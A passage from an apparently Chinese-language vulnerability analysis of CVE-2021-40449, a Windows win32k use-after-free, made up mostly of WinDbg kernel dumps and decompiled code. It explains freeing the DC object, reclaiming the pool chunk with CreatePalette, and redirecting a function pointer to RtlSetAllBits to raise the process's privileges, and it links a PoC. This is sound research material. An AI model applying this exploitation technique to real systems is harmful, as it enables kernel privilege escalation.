rcx=00000000092105f1</code></pre><p>第二次调用DCOBJ构造函数时，由于传入的是同一个HDC句柄，所以HDC句柄引用次数+1，同时两次调用构造函数构造的对象关联到同一个DC对象。</p><p><img alt="image-20211110162021866" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110162021866.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2021-40449-analyse.assets/%E4%B8%A4%E4%B8%AA%E5%AF%B9%E8%B1%A1%E5%85%B3%E7%B3%BB%E5%9B%BE.jpg"/></p><p>之后第二次调用win32kfull!_imp_hdcOpenDCW函数，在该函数内执行政策回调函数，win32kfull!imp_hdcOpenDCW返回一个HDC句柄值为<code>0000000003210041</code>，即创建了一个新的DC对象。之后通过新创建的DC对象创建DCO对象。</p><p><img alt="image-20211110163914337" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110163914337.png"/></p><p>在win32kfull!GreResetDCInternal后半段会调用win32kfull!_imp_HmgSwapLockedHandleContents交换第一个HDC句柄和第二次调用win32kfull!imp_hdcOpenDCW创建的HDC句柄。</p><p><img alt="image-20211110164604391" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110164604391.png"/></p><p>调用win32kfull!_imp_HmgSwapLockedHandleContents之后两个句柄对应的DC内容为已经发生了交换</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// 以下内容为旧DC对象，但是句柄为新句柄</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffffd50e041fd010</span></span><span style="display:flex;"><span>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d010<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">03210041</span><span style="color:#ae81ff">80000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffffd50e03fee010</span></span><span style="display:flex;"><span><span style="color:#75715e">// 以下内容为新DC对象，但句柄为旧句柄</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">03f</span>ee010<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">092105f</span><span style="color:#ae81ff">1</span><span style="color:#ae81ff">80000002</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>......</span></span></code></pre></div><p>之后调用win32kfull!_imp_bDeleteDCInternal传入HDC句柄，该函数会释放HDC句柄对应的DC对象，而此时传入该函数的HDC句柄为第二次调用hdcOpenDCW函数返回的句柄，但之前交换过新旧句柄，所以实际上释放的是旧HDC句柄对应的DC对象。</p><p><img alt="image-20211110164912079" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211110164912079.png"/></p><p>之前计算函数指针的时候，我们知道DCO +0x30是指向DC对象的指针，所以在调用win32kfull!_imp_bDeleteDCInternal函数之后，原DC对象的内存空间已经被释放，达成了use-after-free的第一步free。</p><blockquote><p>function pointer=* (* (DCO +0x30)+0xad0)，其中DCO +0x30即指向DC对象的指针</p></blockquote><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffffd50e041fd010<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span><span style="color:#75715e">// 取DC对象地址</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d040 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">!</span>pool ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052030</span><span style="color:#75715e">// DC对象的内存已被释放，大小为e30</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>Pool page ffffd50e00052030 region is Paged session pool</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>ffffd50e00052000 size: e30 previous size:<span style="color:#ae81ff">0</span> (Free )<span style="color:#f92672">*</span>GDev</span></span><span style="display:flex;"><span> Pooltag GDev : Gdi pdev</span></span><span style="display:flex;"><span> ffffd50e00052e30 size:<span style="color:#ae81ff">10</span> previous size:<span style="color:#a6e22e">e30</span> (Free) Free</span></span><span style="display:flex;"><span> ffffd50e00052e40 size:<span style="color:#ae81ff">1</span>c0 previous size:<span style="color:#ae81ff">10</span> (Allocated) Usqu</span></span></code></pre></div><p>之后只需要申请这块内存空间并构造，刚删除的时候，虽然DC对象已经被释放，但函数指针还是指向正确的函数地址，接下来就要申请空间，覆盖这块内存空间的函数指针的值即可。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffffd50e041fd010<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span><span style="color:#75715e">// 取DC对象地址</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">041f</span>d040 ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052030</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0xad0</span><span style="color:#75715e">// 取DC对象内的函数指针</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>ffffd50e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00052</span>b00 ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c30 ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1db18c0</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> u ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c30</span></span><span style="display:flex;"><span>win32kfull<span style="color:#f92672">!</span>UMPDDrvResetPDEV:</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c30<span style="color:#ae81ff">48895</span>c2418 mov qword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>h],rbx</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c35<span style="color:#ae81ff">4889742420</span> mov qword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">20</span>h],rsi</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c3a<span style="color:#ae81ff">57</span> push rdi</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c3b<span style="color:#ae81ff">4883</span>ec70 sub rsp,<span style="color:#ae81ff">70</span>h</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c3f<span style="color:#ae81ff">488</span>b05ba440800 mov rax,qword ptr [win32kfull<span style="color:#f92672">!</span><span style="color:#a6e22e">_security_cookie</span> (ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f95100)]</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c46<span style="color:#ae81ff">4833</span>c4 xor rax,rsp</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c49<span style="color:#ae81ff">4889442468</span> mov qword ptr [rsp<span style="color:#f92672">+</span><span style="color:#ae81ff">68</span>h],rax</span></span><span style="display:flex;"><span>ffffd548<span style="color:#960050;background-color:#1e0010">`</span>a1f10c4e<span style="color:#ae81ff">488</span>bf9 mov rdi,rcx</span></span></code></pre></div><h4 id="use-部分">use 部分</h4><p>注：此部分为第二次调试，所以句柄、内存地址和前部分不一样。</p><p>在poc里面会调用CreatePalette函数，该此函数会申请内核堆，</p><p>第一个句柄<code>rcx=0000000015213372</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// 第一个DCO对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq rbx</span></span><span style="display:flex;"><span>DBGHELP: SharedUserData<span style="color:#f92672">-</span> virtual symbol module</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">847</span>d2620<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">15213372</span><span style="color:#ae81ff">80000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#75715e">// 第一个PDC 指向DC对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">847</span>d2620<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">847</span>d2650 ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#75715e">// 第一个DC对象</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063030</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063030</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063040</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80046010</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063050</span><span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000001</span> ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063030</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063060</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">8180</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063070</span> ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a36b4e50<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063080</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063090</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">800630</span>a0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>第二个句柄<code>rax=0000000001211b60</code></p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq rdx</span></span><span style="display:flex;"><span>DBGHELP: SharedUserData<span style="color:#f92672">-</span> virtual symbol module</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">84121620</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">01211</span>b60<span style="color:#ae81ff">80000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq rdx<span style="color:#f92672">+</span><span style="color:#ae81ff">0x30</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">84121650</span> ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b030<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> dq ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b030</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b030<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b040<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span> ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063030</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b050<span style="color:#ae81ff">00000001</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000001</span> ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b030</span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b060<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">0000</span><span style="color:#ae81ff">8180</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b070 ffffb48d<span style="color:#960050;background-color:#1e0010">`</span>a317b8b0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b080<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b090<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span><span style="display:flex;"><span>ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">8006</span>b0a0<span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span></span></span></code></pre></div><p>在DeleteDCInternel调用之后第一个DC对象的内存空间已经被释放</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span><span style="color:#f92672">!</span>pool ffff885e<span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">80063030</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 注意，此时DC对象地址距离堆头地址为0x30大小</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>Pool page ffff885e80063030 region is Paged session pool</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>ffff885e80063000 size: e30 previous size:<span style="color:#ae81ff">0</span> (Free )<span style="color:#f92672">*</span>GDev</span></span><span style="display:flex;"><span> Pooltag GDev : Gdi pdev</span></span><span style="display:flex;"><span> ffff885e80063e30 size:<span style="color:#ae81ff">70</span> previous size:<span style="color:#a6e22e">e30</span> (Free) Free</span></span><span style="display:flex;"><span> ffff885e80063ea0 size: b0 previous size:<span style="color:#ae81ff">70</span> (Free ) Usqm</span></span><span style="display:flex;"><span> ffff885e80063f50 size: b0 previous size:<span style="color:#a6e22e">b0</span> (Allocated) Usqm</span></span></code></pre></div><p>根据调试，可以得知释放的DC对象内存大小为0xe30，所以要覆盖函数指针时，所申请的内存也要刚刚好或者接近这块内存大小才有可能申请到。在poc里面，使用CreatePalette申请这块内核堆。这个函数会通过系统调用进入内核函数win32kfull!NtGdiCreatePaletteInternal，该函数调用win32kbase!PALMEMOBJ::bCreatePalette创造Palette对象，win32kbase!PALMEMOBJ::bCreatePalette会调用AllocateObject为新对象申请空间，最终通过调用ExAllocatePoolWithTag函数分配堆空间，整个调用栈如下：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#f92672">:</span> kd<span style="color:#f92672">></span> kb</span></span><span style="display:flex;"><span><span style="color:#75715e"># RetAddr : Call Site</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#ae81ff">00</span> ffff880c<span style="color:#960050;background-color:#1e0010">`</span>b95d39f4 : win32kbase<span style="color:#f92672">!</span>Win32AllocPool</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span> ffff880c<span style="color:#960050;background-color:#1e0010">`</span>b95d0042 : win32kbase<span style="color:#f92672">!</span>AllocateObject<span style="color:#f92672">+</span><span style="color:#ae81ff">0xc4</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span> ffff880c<span style="color:#960050;background-color:#1e0010">`</span>b9309ecc : win32kbase<span style="color:#f92672">!</span>PALMEMOBJ<span style="color:#f92672">::</span>bCreatePalette<span style="color:#f92672">+</span><span style="color:#ae81ff">0xb2</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span> fffff800<span style="color:#960050;background-color:#1e0010">`</span>b175a193 : win32kfull<span style="color:#f92672">!</span>NtGdiCreatePaletteInternal<span style="color:#f92672">+</span><span style="color:#ae81ff">0xcc</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#ae81ff">00007ff</span>e<span style="color:#960050;background-color:#1e0010">`</span>a2cb2604 : nt<span style="color:#f92672">!</span>KiSystemServiceCopyEnd<span style="color:#f92672">+</span><span style="color:#ae81ff">0x13</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span><span style="color:#ae81ff">00007ff</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">`</span>e44c2fe1 : win32u<span style="color:#f92672">!</span>NtGdiCreatePaletteInternal<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000</span>d94 : cve_2021_40449<span style="color:#f92672">!</span>createPaletteofSize1<span style="color:#f92672">+</span><span style="color:#ae81ff">0xd1</span> [C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>mimi<span style="color:#960050;background-color:#1e0010">\</span>source<span style="color:#960050;background-color:#1e0010">\</span>repos<span style="color:#960050;background-color:#1e0010">\</span>test<span style="color:#960050;background-color:#1e0010">\</span>cve<span style="color:#f92672">-</span><span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">40449</span><span style="color:#960050;background-color:#1e0010">\</span>main.cpp<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">71</span>]</span></span><span style="display:flex;"><span>.......</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>e<span style="color:#ae81ff">00007ff</span>e<span style="color:#960050;background-color:#1e0010">`</span>a2e9b26f :<span style="color:#ae81ff">0x000000d1</span><span style="color:#960050;background-color:#1e0010">`</span>a374ef69</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2f</span><span style="color:#ae81ff">00007ff</span>e<span style="color:#960050;background-color:#1e0010">`</span>a39e1a4a : gdi32full<span style="color:#f92672">!</span>GdiPrinterThunk<span style="color:#f92672">+</span><span style="color:#ae81ff">0x21f</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">30</span><span style="color:#ae81ff">00007ff</span>e<span style="color:#960050;background-color:#1e0010">`</span>a61889e4 : USER32<span style="color:#f92672">!</span>__ClientPrinterThunk<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3a</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">31</span><span style="color:#ae81ff">00007ff</span>e<span style="color:#960050;background-color:#1e0010">`</span>a2cb6dc4 : ntdll<span style="color:#f92672">!</span>KiUserCallbackDispatcherContinue</span></span><span style="display:flex;"><span><span style="color:#ae81ff">32</span><span style="color:#ae81ff">00007ff</span>e<span style="color:#960050;background-color:#1e0010">`</span>a2e7edda : win32u<span style="color:#f92672">!</span>NtGdiResetDC<span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">33</span><span style="color:#ae81ff">00007ff</span>e<span style="color:#960050;background-color:#1e0010">`</span>a3682371 : gdi32full<span style="color:#f92672">!</span>ResetDCWInternal<span style="color:#f92672">+</span><span style="color:#ae81ff">0x17a</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">34</span><span style="color:#ae81ff">00007ff</span><span style="color:#ae81ff">7</span><span style="color:#960050;background-color:#1e0010">`</span>e44c3296 : GDI32<span style="color:#f92672">!</span>ResetDCW<span style="color:#f92672">+</span><span style="color:#ae81ff">0x31</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">35</span><span style="color:#ae81ff">00000000</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">00000000</span><span style="color:#f92672">:</span> cve_2021_40449<span style="color:#f92672">!</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">0x146</span> [C:<span style="color:#960050;background-color:#1e0010">\</span>Users<span style="color:#960050;background-color:#1e0010">\</span>mimi<span style="color:#960050;background-color:#1e0010">\</span>source<span style="color:#960050;background-color:#1e0010">\</span>repos<span style="color:#960050;background-color:#1e0010">\</span>test<span style="color:#960050;background-color:#1e0010">\</span>cve<span style="color:#f92672">-</span><span style="color:#ae81ff">2021</span><span style="color:#f92672">-</span><span style="color:#ae81ff">40449</span><span style="color:#960050;background-color:#1e0010">\</span>main.cpp<span style="color:#960050;background-color:#1e0010">@</span><span style="color:#ae81ff">685</span>]</span></span></code></pre></div><p>win32kbase!Win32AllocPool代码如下，最终是通过调用<code>ExAllocatePoolWithTag</code>申请堆，win32kbase!Win32AllocPool的a1参数为要申请的堆内存大小，调试过程中可以得知其要申请0xe20大小的堆，加上堆头，刚好接近刚释放的0xe3大小的堆空间大小。</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span><span style="color:#a6e22e">Win32AllocPool</span>(<span style="color:#66d9ef">__int64</span> a1,<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a2)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> v2;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v3;<span style="color:#75715e">// rdi</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> result;<span style="color:#75715e">// rax</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v2<span style="color:#f92672">=</span> a2;</span></span><span style="display:flex;"><span> v3<span style="color:#f92672">=</span> a1;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">signed</span><span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">IsWin32AllocPoolImplSupported_0</span>()<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0</span> )</span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span></span></span><span style="display:flex;"><span> result<span style="color:#f92672">=</span><span style="color:#a6e22e">Win32AllocPoolImpl_0</span>(<span style="color:#ae81ff">33</span>i64, v3, v2);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> result;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p><img alt="image-20211111140552152" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211111140552152.png"/></p><p>同时在Poc代码分析里面分析了DC对象函数指针和堆头之间的位置关系，所以通过构造传入CreatePalette的LOGPALETTE结构可以刚刚好覆盖原DC对象内的函数指针以及该函数指针要调用的参数，内存分布具体见https://github.com/CppXL/cve-2021-40449-poc/blob/master/main.cpp 里面的注释。</p><p><img alt="image-20211112195951766" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112195951766.png"/></p><p>通过函数指针调用RtlSetAllBits函数并传入RtklBitMap型指针，其中RtlBitMap的buffer指向POC进程自身的权限位，如下图：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span><span style="color:#66d9ef">struct</span> _RTL_BITMAP {</span></span><span style="display:flex;"><span> ULONG SizeOfBitMap;</span></span><span style="display:flex;"><span> ULONG<span style="color:#f92672">*</span>Buffer;</span></span><span style="display:flex;"><span>} RTL_BITMAP,<span style="color:#f92672">*</span>PRTL_BITMAP;</span></span></code></pre></div><p><img alt="image-20211112200708126" src="/images/vulnerability/CVE-2021-40449-analyse.assets/image-20211112200708126.png"/></p><div class="highlight"><pre tabindex="0" 